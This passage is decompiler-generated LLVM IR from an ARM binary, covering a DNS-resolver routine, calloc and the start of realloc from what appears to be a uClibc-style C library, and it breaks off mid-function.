  %v4_2ca80 = inttoptr i32 %v3_2ca80 to i32*
  store i32 %v0_2ca80, i32* %v4_2ca80, align 4
  %v0_2ca84 = load i32, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_2ca8c = load i32, i32* @fp, align 4
  %v2_2ca8c = inttoptr i32 %v1_2ca8c to i32*
  store i32 -1, i32* %v2_2ca8c, align 4
  %v7_2ca90 = icmp sgt i32 %v0_2ca84, 255
  br i1 %v7_2ca90, label %dec_label_pc_2ca98, label %bb27

bb27:                                             ; preds = %dec_label_pc_2ca60
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2cc24

dec_label_pc_2ca98:                               ; preds = %dec_label_pc_2ca60
  %v0_2ca98 = load i32, i32* @r8, align 4
  %v1_2ca98 = load i32, i32* %r1.global-to-local, align 4
  %v2_2ca98 = add i32 %v1_2ca98, %v0_2ca98
  store i32 %v2_2ca98, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_2caa0 = add i32 %v2_2ca98, 16
  store i32 %v1_2caa0, i32* %r2.global-to-local, align 4
  %v1_2caa4 = add i32 %v2_2ca98, 24
  store i32 %v1_2caa4, i32* @r5, align 4
  %v3_2caac = inttoptr i32 %v1_2caa0 to i32*
  store i32 %v2_2ca98, i32* %v3_2caac, align 4
  %v0_2cab0 = load i32, i32* @sb, align 4
  store i32 %v0_2cab0, i32* @r1, align 4
  %v0_2cab4 = load i32, i32* @r4, align 4
  %v1_2cab4 = load i32, i32* %r2.global-to-local, align 4
  %v2_2cab4 = add i32 %v1_2cab4, 4
  %v3_2cab4 = inttoptr i32 %v2_2cab4 to i32*
  store i32 %v0_2cab4, i32* %v3_2cab4, align 4
  %v0_2cab8 = load i32, i32* @r5, align 4
  store i32 %v0_2cab8, i32* %r0.global-to-local, align 4
  %v0_2cabc = load i32, i32* @sl, align 4
  store i32 %v0_2cabc, i32* %r2.global-to-local, align 4
  %v3_2cac0 = call i32 @strncpy(i32 %v0_2cab8, i32 %v0_2cab0, i32 %v0_2cabc)
  %v0_2cac4 = load i32, i32* @r4, align 4
  %v1_2cac4 = trunc i32 %v0_2cac4 to i8
  %v2_2cac4 = load i32, i32* @r5, align 4
  %v3_2cac4 = load i32, i32* @sl, align 4
  %v4_2cac4 = add i32 %v3_2cac4, %v2_2cac4
  %v5_2cac4 = inttoptr i32 %v4_2cac4 to i8*
  store i8 %v1_2cac4, i8* %v5_2cac4, align 1
  %v0_2cac8 = load i32, i32* @sb, align 4
  store i32 %v0_2cac8, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_2cad0 = load i32, i32* @r8, align 4
  store i32 %v0_2cad0, i32* %r2.global-to-local, align 4
  %v3_2cad4 = inttoptr i32 %v0_2cac8 to i8*
  %v4_2cad4 = call i32 @inet_pton(i32 10, i8* %v3_2cad4, i32 %v0_2cad0)
  store i32 %v4_2cad4, i32* %r0.global-to-local, align 4
  %v1_2cad8 = load i32, i32* @r4, align 4
  %v9_2cad8 = icmp eq i32 %v4_2cad4, %v1_2cad8
  br i1 %v9_2cad8, label %dec_label_pc_2cb10, label %dec_label_pc_2cae0

dec_label_pc_2cae0:                               ; preds = %dec_label_pc_2ca98
  store i32 %v1_2caa0, i32* @ip, align 4
  %v0_2cae8 = load i32, i32* @r7, align 4
  store i32 %v0_2cae8, i32* %v2_2c9bc, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_2caf0 = load i32, i32* @r7, align 4
  %v2_2caf0 = add i32 %v1_2caf0, 8
  %v3_2caf0 = inttoptr i32 %v2_2caf0 to i32*
  store i32 10, i32* %v3_2caf0, align 4
  %v0_2caf4 = load i32, i32* @r4, align 4
  store i32 %v0_2caf4, i32* %r0.global-to-local, align 4
  %v0_2caf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_2caf8 = add i32 %v0_2caf8, 6
  store i32 %v1_2caf8, i32* %r3.global-to-local, align 4
  %v1_2cafc = load i32, i32* @r7, align 4
  %v2_2cafc = add i32 %v1_2cafc, 12
  %v3_2cafc = inttoptr i32 %v2_2cafc to i32*
  store i32 %v1_2caf8, i32* %v3_2cafc, align 4
  %v0_2cb00 = load i32, i32* @r5, align 4
  %v1_2cb00 = load i32, i32* @r7, align 4
  %v2_2cb00 = inttoptr i32 %v1_2cb00 to i32*
  store i32 %v0_2cb00, i32* %v2_2cb00, align 4
  %v0_2cb04 = load i32, i32* @ip, align 4
  %v1_2cb04 = load i32, i32* @r7, align 4
  %v2_2cb04 = add i32 %v1_2cb04, 16
  %v3_2cb04 = inttoptr i32 %v2_2cb04 to i32*
  store i32 %v0_2cb04, i32* %v3_2cb04, align 4
  %v0_2cb08 = load i32, i32* @r4, align 4
  %v1_2cb08 = load i32, i32* @fp, align 4
  %v2_2cb08 = inttoptr i32 %v1_2cb08 to i32*
  store i32 %v0_2cb08, i32* %v2_2cb08, align 4
  br label %dec_label_pc_2cc24

dec_label_pc_2cb10:                               ; preds = %dec_label_pc_2ca98
  %v0_2cb10 = load i32, i32* @r6, align 4
  %v2_2cb10 = icmp eq i32 %v0_2cb10, 0
  br i1 %v2_2cb10, label %dec_label_pc_2cb18, label %dec_label_pc_2cc10

dec_label_pc_2cb18:                               ; preds = %dec_label_pc_2cb10
  %v2_2cb18 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_2cb18, i32* @r4, align 4
  store i32 %v2_2cb18, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v3_2cb28 = bitcast i32* %stack_var_-84 to i8*
  %v4_2cb28 = call i32 @__GI_memset(i8* %v3_2cb28, i32 0, i32 40)
  store i32 %v4_2cb28, i32* %r0.global-to-local, align 4
  %v2_2cb30 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_2cb30, i32* @sb, align 4
  %v7_2cb70 = icmp eq i32 %tmp7, 5
  br label %dec_label_pc_2cb34

dec_label_pc_2cb34:                               ; preds = %dec_label_pc_2cb88, %dec_label_pc_2cb18
  store i32 %v2_2cb30, i32* %r2.global-to-local, align 4
  store i32 %v2_2cb18, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r1.global-to-local, align 4
  %v0_2cb40 = load i32, i32* @r5, align 4
  store i32 %v0_2cb40, i32* %r0.global-to-local, align 4
  %v4_2cb44 = inttoptr i32 %v0_2cb40 to i8*
  %v5_2cb44 = call i32 @__dns_lookup(i8* %v4_2cb44, i32 28, i32 %v2_2cb30, i32 %v2_2cb18)
  store i32 %v5_2cb44, i32* @r4, align 4
  %v1_2cb48 = icmp slt i32 %v5_2cb44, 0
  %v0_2cb4c = load i32, i32* @sl, align 4
  store i32 %v0_2cb4c, i32* %r2.global-to-local, align 4
  %v0_2cb50 = load i32, i32* @r6, align 4
  %v1_2cb50 = add i32 %v0_2cb50, 1
  store i32 %v1_2cb50, i32* @r6, align 4
  %v0_2cb54 = load i32, i32* @r5, align 4
  store i32 %v0_2cb54, i32* %r0.global-to-local, align 4
  br i1 %v1_2cb48, label %dec_label_pc_2cc10, label %dec_label_pc_2cb5c

dec_label_pc_2cb5c:                               ; preds = %dec_label_pc_2cb34
  %v3_2cb5c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_2cb5c, i32* @r1, align 4
  %v3_2cb60 = call i32 @strncpy(i32 %v0_2cb54, i32 %v3_2cb5c, i32 %v0_2cb4c)
  %v3_2cb64 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_2cb64, i32* @r0, align 4
  %v0_2cb68 = call i32 @free()
  store i32 %v0_2cb68, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r1.global-to-local, align 4
  %v0_2cb74 = load i32, i32* @r4, align 4
  store i32 %v0_2cb74, i32* %r2.global-to-local, align 4
  %v0_2cb78 = load i32, i32* @r5, align 4
  store i32 %v0_2cb78, i32* @r3, align 4
  br i1 %v7_2cb70, label %dec_label_pc_2cb80, label %dec_label_pc_2cbb8

dec_label_pc_2cb80:                               ; preds = %dec_label_pc_2cb5c
  %v0_2cb80 = load i32, i32* @r6, align 4
  %v8_2cb84 = icmp sgt i32 %v0_2cb80, 5
  br i1 %v8_2cb84, label %dec_label_pc_2cbac, label %dec_label_pc_2cb88

dec_label_pc_2cb88:                               ; preds = %dec_label_pc_2cb80
  store i32 %tmp6, i32* @r1, align 4
  %v3_2cb8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2cb8c, i32* %r0.global-to-local, align 4
  %v0_2cb90 = load i32, i32* @sl, align 4
  %v5_2cb94 = call i32 @__decode_dotted(i32 %v3_2cb8c, i32 %tmp6, i32 %v0_2cb74, i32 %v0_2cb78, i32 %v0_2cb90)
  store i32 %v5_2cb94, i32* @r4, align 4
  %v3_2cb9c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2cb9c, i32* @r0, align 4
  %v0_2cba0 = call i32 @free()
  store i32 %v0_2cba0, i32* %r0.global-to-local, align 4
  %v0_2cba4 = load i32, i32* @r4, align 4
  %v1_2cba4 = icmp slt i32 %v0_2cba4, 0
  br i1 %v1_2cba4, label %dec_label_pc_2cbac, label %dec_label_pc_2cb34

dec_label_pc_2cbac:                               ; preds = %dec_label_pc_2cb88, %dec_label_pc_2cb80
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2cc18

dec_label_pc_2cbb8:                               ; preds = %dec_label_pc_2cb5c
  %v7_2cbb8 = icmp eq i32 %tmp7, 28
  br i1 %v7_2cbb8, label %dec_label_pc_2cbc0, label %dec_label_pc_2cc08

dec_label_pc_2cbc0:                               ; preds = %dec_label_pc_2cbb8
  store i32 16, i32* @r2, align 4
  %v0_2cbc8 = load i32, i32* @r8, align 4
  store i32 %v0_2cbc8, i32* @r0, align 4
  %v0_2cbcc = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_2caa0, i32* @lr, align 4
  %v1_2cbd8 = load i32, i32* @r7, align 4
  %v2_2cbd8 = add i32 %v1_2cbd8, 8
  %v3_2cbd8 = inttoptr i32 %v2_2cbd8 to i32*
  store i32 10, i32* %v3_2cbd8, align 4
  %v0_2cbdc = load i32, i32* %r3.global-to-local, align 4
  %v1_2cbdc = add i32 %v0_2cbdc, 6
  store i32 %v1_2cbdc, i32* %r3.global-to-local, align 4
  %v1_2cbe0 = load i32, i32* @r7, align 4
  %v2_2cbe0 = add i32 %v1_2cbe0, 12
  %v3_2cbe0 = inttoptr i32 %v2_2cbe0 to i32*
  store i32 %v1_2cbdc, i32* %v3_2cbe0, align 4
  %v3_2cbe4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2cbe4, i32* @r0, align 4
  %v0_2cbe8 = load i32, i32* @r5, align 4
  %v1_2cbe8 = load i32, i32* @r7, align 4
  %v2_2cbe8 = inttoptr i32 %v1_2cbe8 to i32*
  store i32 %v0_2cbe8, i32* %v2_2cbe8, align 4
  %v0_2cbec = load i32, i32* @lr, align 4
  %v1_2cbec = load i32, i32* @r7, align 4
  %v2_2cbec = add i32 %v1_2cbec, 16
  %v3_2cbec = inttoptr i32 %v2_2cbec to i32*
  store i32 %v0_2cbec, i32* %v3_2cbec, align 4
  %v0_2cbf0 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_2cc00 = load i32, i32* @r7, align 4
  store i32 %v0_2cc00, i32* %v2_2c9bc, align 4
  %v0_2cc18.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2cc18

dec_label_pc_2cc08:                               ; preds = %dec_label_pc_2cbb8
  %v3_2cc08 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2cc08, i32* @r0, align 4
  %v0_2cc0c = call i32 @free()
  store i32 %v0_2cc0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2cc10

dec_label_pc_2cc10:                               ; preds = %dec_label_pc_2cb34, %dec_label_pc_2cb10, %dec_label_pc_2cc08
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2cc18

dec_label_pc_2cc18:                               ; preds = %dec_label_pc_2cbc0, %dec_label_pc_2cbac, %dec_label_pc_2cc10
  %v0_2cc18 = phi i32 [ %v0_2cc18.pre, %dec_label_pc_2cbc0 ], [ 3, %dec_label_pc_2cbac ], [ 1, %dec_label_pc_2cc10 ]
  %v1_2cc18 = load i32, i32* @fp, align 4
  %v2_2cc18 = inttoptr i32 %v1_2cc18 to i32*
  store i32 %v0_2cc18, i32* %v2_2cc18, align 4
  br label %dec_label_pc_2cc24

dec_label_pc_2cc20:                               ; preds = %dec_label_pc_2c9b0, %dec_label_pc_2c9c4
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2cc24

dec_label_pc_2cc24:                               ; preds = %.thread1, %bb27, %dec_label_pc_2ca48, %dec_label_pc_2ca2c, %dec_label_pc_2cc18, %dec_label_pc_2cae0, %dec_label_pc_2c990, %dec_label_pc_2cc20
  store i32 %v6_2c970, i32* @r5, align 4
  store i32 %v9_2c970, i32* @r6, align 4
  store i32 %v12_2c970, i32* @r7, align 4
  store i32 %v15_2c970, i32* @r8, align 4
  store i32 %v18_2c970, i32* @sb, align 4
  store i32 %v21_2c970, i32* @sl, align 4
  store i32 %v24_2c970, i32* @fp, align 4
  %v1_2cc2c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2cc2c

; uselistorder directives
  uselistorder i32 %v2_2cb18, { 1, 0, 2, 3 }
  uselistorder i32 %v1_2caa0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_2ca68, { 1, 0 }
  uselistorder i32 %v0_2c9d4, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp12, { 3, 2, 0, 1 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 16, 18, 17, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder label %dec_label_pc_2cc24, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_2cc20, { 1, 0 }
  uselistorder label %dec_label_pc_2cc18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2cc10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2ca60, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_2cc44 = load i32, i32* @r4, align 4
  %v6_2cc44 = load i32, i32* @r5, align 4
  %v9_2cc44 = load i32, i32* @r6, align 4
  %v12_2cc44 = load i32, i32* @lr, align 4
  %v2_2cc4c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_2cc5c = mul i32 %arg2, %arg1
  store i32 %v2_2cc5c, i32* @r6, align 4
  br i1 %v2_2cc4c, label %dec_label_pc_2cc94, label %dec_label_pc_2cc64

dec_label_pc_2cc64:                               ; preds = %entry
  %v2_2cc6c = udiv i32 %v2_2cc5c, %arg1
  %v9_2cc70 = icmp eq i32 %v2_2cc6c, %arg2
  br i1 %v9_2cc70, label %dec_label_pc_2cc94, label %dec_label_pc_2cc78

dec_label_pc_2cc78:                               ; preds = %dec_label_pc_2cc64
  %v0_2cc7c = call i32 @__aeabi_read_tp()
  %v3_2cc80 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2cc80 = sext i16 %v3_2cc80 to i32
  store i32 %v4_2cc80, i32* @r2, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_2cc8c = add i32 %v4_2cc80, %v0_2cc7c
  %v4_2cc8c = inttoptr i32 %v3_2cc8c to i32*
  store i32 12, i32* %v4_2cc8c, align 4
  br label %dec_label_pc_2cd58

dec_label_pc_2cc94:                               ; preds = %dec_label_pc_2cc64, %entry
  %v4_2cc98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 120) to i32*), align 4
  store i32 %v4_2cc98, i32* @r4, align 4
  %v4_2ccb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  store i32 %v4_2ccb0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_2ccb0)
  %v0_2ccc4 = load i32, i32* @r5, align 4
  %v2_2ccc4 = add i32 %v0_2ccc4, 20
  %v3_2ccc4 = inttoptr i32 %v2_2ccc4 to i32*
  %v4_2ccc4 = load i32, i32* %v3_2ccc4, align 4
  store i32 %v4_2ccc4, i32* %ip.global-to-local, align 4
  store i32 183504, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2ccc4)
  %v0_2ccd0 = load i32, i32* @r6, align 4
  %v1_2ccd4 = call i32 @malloc(i32 %v0_2ccd0)
  store i32 %v1_2ccd4, i32* %r4.global-to-local, align 4
  %v2_2ccd8 = icmp eq i32 %v1_2ccd4, 0
  br i1 %v2_2ccd8, label %.thread, label %dec_label_pc_2cce0

dec_label_pc_2cce0:                               ; preds = %dec_label_pc_2cc94
  %v1_2cce0 = add i32 %v1_2ccd4, -4
  %v2_2cce0 = inttoptr i32 %v1_2cce0 to i32*
  %v3_2cce0 = load i32, i32* %v2_2cce0, align 4
  %v1_2cce4 = and i32 %v3_2cce0, 2
  %v2_2cce4 = icmp eq i32 %v1_2cce4, 0
  br i1 %v2_2cce4, label %dec_label_pc_2ccec, label %.thread

dec_label_pc_2ccec:                               ; preds = %dec_label_pc_2cce0
  %v1_2ccec6 = add i32 %v3_2cce0, -4
  %v1_2ccf0 = and i32 %v1_2ccec6, -4
  store i32 %v1_2ccf0, i32* @r2, align 4
  %v3_2ccf4 = udiv i32 %v1_2ccf0, 4
  store i32 %v3_2ccf4, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_2ccf0, 36
  %v2_2ccfc = icmp ult i32 %v1_2ccf0, 33
  %v3_2ccfc = or i1 %tmp, %v2_2ccfc
  br i1 %v3_2ccfc, label %dec_label_pc_2cd08, label %dec_label_pc_2cd00

dec_label_pc_2cd00:                               ; preds = %dec_label_pc_2ccec
  %v3_2cd00 = inttoptr i32 %v1_2ccd4 to i8*
  %v4_2cd00 = call i32 @__GI_memset(i8* %v3_2cd00, i32 0, i32 %v1_2ccf0)
  br label %.thread

dec_label_pc_2cd08:                               ; preds = %dec_label_pc_2ccec
  %tmp7 = icmp eq i32 %v1_2ccf0, 16
  %v2_2cd0c = inttoptr i32 %v1_2ccd4 to i32*
  store i32 0, i32* %v2_2cd0c, align 4
  %v1_2cd10 = load i32, i32* %r4.global-to-local, align 4
  %v2_2cd10 = add i32 %v1_2cd10, 4
  %v3_2cd10 = inttoptr i32 %v2_2cd10 to i32*
  store i32 0, i32* %v3_2cd10, align 4
  %v1_2cd14 = load i32, i32* %r4.global-to-local, align 4
  %v2_2cd14 = add i32 %v1_2cd14, 8
  %v3_2cd14 = inttoptr i32 %v2_2cd14 to i32*
  store i32 0, i32* %v3_2cd14, align 4
  %v2_2cd18 = icmp ult i32 %v1_2ccf0, 13
  %v3_2cd18 = or i1 %tmp7, %v2_2cd18
  br i1 %v3_2cd18, label %.thread, label %dec_label_pc_2cd1c

dec_label_pc_2cd1c:                               ; preds = %dec_label_pc_2cd08
  %v0_2cd1c = load i32, i32* %ip.global-to-local, align 4
  %v1_2cd20 = load i32, i32* %r4.global-to-local, align 4
  %v2_2cd20 = add i32 %v1_2cd20, 12
  %v3_2cd20 = inttoptr i32 %v2_2cd20 to i32*
  store i32 0, i32* %v3_2cd20, align 4
  %v1_2cd24 = load i32, i32* %r4.global-to-local, align 4
  %v2_2cd24 = add i32 %v1_2cd24, 16
  %v3_2cd24 = inttoptr i32 %v2_2cd24 to i32*
  store i32 0, i32* %v3_2cd24, align 4
  %tmp8 = icmp ult i32 %v0_2cd1c, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_2cd2c

dec_label_pc_2cd2c:                               ; preds = %dec_label_pc_2cd1c
  %v0_2cd2c = load i32, i32* %ip.global-to-local, align 4
  %v7_2cd2c = icmp eq i32 %v0_2cd2c, 9
  %v1_2cd30 = load i32, i32* %r4.global-to-local, align 4
  %v2_2cd30 = add i32 %v1_2cd30, 20
  %v3_2cd30 = inttoptr i32 %v2_2cd30 to i32*
  store i32 0, i32* %v3_2cd30, align 4
  %v1_2cd34 = load i32, i32* %r4.global-to-local, align 4
  %v2_2cd34 = add i32 %v1_2cd34, 24
  %v3_2cd34 = inttoptr i32 %v2_2cd34 to i32*
  store i32 0, i32* %v3_2cd34, align 4
  br i1 %v7_2cd2c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2cd2c
  %v2_2cd38 = load i32, i32* %r4.global-to-local, align 4
  %v3_2cd38 = add i32 %v2_2cd38, 32
  %v4_2cd38 = inttoptr i32 %v3_2cd38 to i32*
  store i32 0, i32* %v4_2cd38, align 4
  %v2_2cd3c = load i32, i32* %r4.global-to-local, align 4
  %v3_2cd3c = add i32 %v2_2cd3c, 28
  %v4_2cd3c = inttoptr i32 %v3_2cd3c to i32*
  store i32 0, i32* %v4_2cd3c, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2cd2c, %dec_label_pc_2cce0, %dec_label_pc_2cd1c, %dec_label_pc_2cd08, %dec_label_pc_2cc94, %dec_label_pc_2cd00, %bb
  %v0_2cd4c = load i32, i32* @r5, align 4
  %v2_2cd4c = add i32 %v0_2cd4c, 52
  %v3_2cd4c = inttoptr i32 %v2_2cd4c to i32*
  %v4_2cd4c = load i32, i32* %v3_2cd4c, align 4
  store i32 %v4_2cd4c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_2cd4c)
  br label %dec_label_pc_2cd58

dec_label_pc_2cd58:                               ; preds = %dec_label_pc_2cc78, %.thread
  %v0_2cd58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_2cc44, i32* @r4, align 4
  store i32 %v6_2cc44, i32* @r5, align 4
  store i32 %v9_2cc44, i32* @r6, align 4
  store i32 %v12_2cc44, i32* @lr, align 4
  ret i32 %v0_2cd58

; uselistorder directives
  uselistorder i32 %v1_2ccf0, { 0, 6, 3, 1, 5, 4, 2 }
  uselistorder i32 %v1_2ccd4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2cd58, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_2cd70(i32 %arg1) local_unnamed_addr {
dec_label_pc_2cd70:
  %v0_2cd70 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2cd70, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_2cd70
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_2cd70, %bb
  %v10_2cd80 = phi i32 [ %arg1, %dec_label_pc_2cd70 ], [ 0, %bb ]
  ret i32 %v10_2cd80

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_2cd84 = load i32, i32* @r4, align 4
  %v6_2cd84 = load i32, i32* @r5, align 4
  %v9_2cd84 = load i32, i32* @r6, align 4
  %v12_2cd84 = load i32, i32* @r7, align 4
  %v15_2cd84 = load i32, i32* @r8, align 4
  %v18_2cd84 = load i32, i32* @sb, align 4
  %v21_2cd84 = load i32, i32* @sl, align 4
  %v24_2cd84 = load i32, i32* @fp, align 4
  %v27_2cd84 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_2cd90 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_2cd90, label %dec_label_pc_2cda4, label %dec_label_pc_2cdb4

dec_label_pc_2cda4:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_2cda8 = call i32 @malloc(i32 %arg2)
  store i32 %v1_2cda8, i32* %r0.global-to-local, align 4
  store i32 %v1_2cda8, i32* @r4, align 4
  br label %dec_label_pc_2d114

dec_label_pc_2cdb4:                               ; preds = %entry
  %v2_2cdb4 = icmp eq i32 %arg2, 0
  br i1 %v2_2cdb4, label %dec_label_pc_2cdbc, label %dec_label_pc_2cdc8

dec_label_pc_2cdbc:                               ; preds = %dec_label_pc_2cdb4
  %v0_2cdbc = call i32 @free()
  store i32 %v0_2cdbc, i32* %r0.global-to-local, align 4
  %v0_2cdc0 = load i32, i32* @r6, align 4
  store i32 %v0_2cdc0, i32* @r4, align 4
  br label %dec_label_pc_2d114

dec_label_pc_2cdc8:                               ; preds = %dec_label_pc_2cdb4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_2cdd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 120) to i32*), align 4
  store i32 %v4_2cdd0, i32* @r4, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 %v4_2cdd0, i32* %r2.global-to-local, align 4
  %v4_2cddc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 76) to i32*), align 4
  store i32 %v4_2cddc, i32* %r1.global-to-local, align 4
  %v2_2cde0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_2cde0, i32* %r0.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  %v4_2cde8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2cde8)
  %v0_2cdf4 = load i32, i32* @r4, align 4
  store i32 %v0_2cdf4, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r1.global-to-local, align 4
  %v4_2ce00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 20) to i32*), align 4
  store i32 %v4_2ce00, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_2ce0c.3488 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2ce00)
  %v0_2ce0c = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_2ce0c, -32
  br i1 %tmp36, label %dec_label_pc_2ce30, label %dec_label_pc_2ce14

dec_label_pc_2ce14:                               ; preds = %dec_label_pc_2cdc8
  store i32 88848, i32* %r2.global-to-local, align 4
  %v0_2ce18 = call i32 @__aeabi_read_tp()
  store i32 %v0_2ce18, i32* %r0.global-to-local, align 4
  %v3_2ce1c = load i16, i16* @global_var_42934.3040, align 2
  %v4_2ce1c = sext i16 %v3_2ce1c to i32
  store i32 %v4_2ce1c, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_2ce28 = add i32 %v4_2ce1c, %v0_2ce18
  %v4_2ce28 = inttoptr i32 %v3_2ce28 to i32*
  store i32 12, i32* %v4_2ce28, align 4
  br label %dec_label_pc_2d114

dec_label_pc_2ce30:                               ; preds = %dec_label_pc_2cdc8
  %v1_2ce30 = add i32 %v0_2ce0c, 11
  store i32 %v1_2ce30, i32* %r0.global-to-local, align 4
  %v0_2ce34 = load i32, i32* @r5, align 4
  %v1_2ce34 = add i32 %v0_2ce34, -4
  %v2_2ce34 = inttoptr i32 %v1_2ce34 to i32*
  %v3_2ce34 = load i32, i32* %v2_2ce34, align 4
  store i32 %v3_2ce34, i32* %r2.global-to-local, align 4
  %v2_2ce38 = icmp ugt i32 %v1_2ce30, 14
  %v7_2ce38 = icmp eq i32 %v1_2ce30, 15
  %v2_2ce3c = xor i1 %v2_2ce38, true
  %v3_2ce3c = or i1 %v7_2ce38, %v2_2ce3c
  br i1 %v3_2ce3c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_2ce30
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_2ce30, %bb
  %v2_2ce40 = xor i1 %v7_2ce38, true
  %v3_2ce40 = and i1 %v2_2ce38, %v2_2ce40
  br i1 %v3_2ce40, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_2ce40 = and i32 %v1_2ce30, -8
  store i32 %v5_2ce40, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_2ce44 = and i32 %v3_2ce34, 2
  %v2_2ce44 = icmp eq i32 %v1_2ce44, 0
